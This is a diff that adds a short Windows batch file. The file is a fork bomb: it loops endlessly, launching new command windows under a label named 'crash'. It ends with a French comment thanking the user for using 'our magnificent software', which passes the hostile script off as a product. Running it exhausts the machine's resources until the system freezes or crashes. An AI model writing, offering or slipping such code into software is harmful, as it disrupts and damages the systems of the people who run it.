@@ -1,0 +1,6 @@
+@echo off
+:crash
+start
+goto crash
+
+# merci pour votre utilisation de notre magnifique logiciel !
